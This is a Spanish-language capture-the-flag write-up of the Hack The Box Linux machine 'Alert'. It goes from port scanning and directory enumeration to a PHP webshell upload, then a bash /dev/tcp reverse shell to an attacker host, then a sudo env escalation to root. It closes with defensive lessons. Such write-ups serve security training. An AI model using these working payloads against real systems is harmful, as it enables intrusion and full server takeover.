# Alert — Hack The Box

**Plataforma:** Hack The Box  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** HTB  
**Fecha de creación:** 2025  
**Técnicas:** Enumeration · Web Exploitation · Reverse Shell · Privilege Escalation · Sudo Abuse · GTFOBins

---

## Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración web](#2-enumeración-web)
3. [Explotación inicial](#3-explotación-inicial)
4. [Reverse Shell](#4-reverse-shell)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Reconocimiento

Comenzamos realizando un escaneo de puertos sobre la máquina objetivo.

```bash
nmap -sS -sCV -Pn IP
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

El servidor cuenta con un servicio SSH y un servidor web accesible por HTTP.

---

## 2. Enumeración web

Accedemos al servidor web desde el navegador:

```text
http://IP
```

Exploramos directorios ocultos utilizando Gobuster:

```bash
gobuster dir -u http://IP \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,txt
```

Resultado:

```text
/index.php
/uploads
/admin
```

Investigando las funcionalidades disponibles encontramos una posible subida de archivos vulnerable.

---

## 3. Explotación inicial

Creamos una WebShell PHP para ejecutar comandos desde el navegador.

```php
<?php
system($_GET['cmd']);
?>
```

Guardamos el archivo como:

```text
shell.php
```

Subimos el fichero al servidor y comprobamos que ejecuta comandos:

```text
http://IP/uploads/shell.php?cmd=id
```

Resultado:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

La aplicación es vulnerable a ejecución remota de comandos.

---

## 4. Reverse Shell

Nos ponemos en escucha desde nuestra máquina atacante:

```bash
sudo nc -lvnp 443
```

Ejecutamos una reverse shell Bash desde la WebShell:

```bash
bash -c 'bash -i >& /dev/tcp/IP_ATACANTE/443 0>&1'
```

Obtenemos acceso interactivo:

```bash
whoami
```

Resultado:

```text
www-data
```

Exploramos el sistema y revisamos permisos sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/env
```

---

## 5. Escalada de privilegios

Consultamos GTFOBins para el binario `env`.

Payload utilizado:

```bash
sudo /usr/bin/env /bin/sh
```

Verificamos privilegios:

```bash
whoami
```

Resultado:

```text
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| File Upload vulnerable | Ejecución remota de comandos |
| PHP WebShell | Acceso interactivo |
| Reverse Shell | Compromiso del servidor |
| sudo sobre env | Escalada directa a root |

**Para defenderse:**

- Validar correctamente los archivos subidos.
- Restringir ejecución de scripts en directorios uploads.
- Aplicar listas blancas de extensiones.
- Limitar binarios peligrosos mediante sudo.
- Aplicar principio de mínimo privilegio.

---

*Writeup por [Arabot](https://github.com/Caan31) · Hack The Box · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*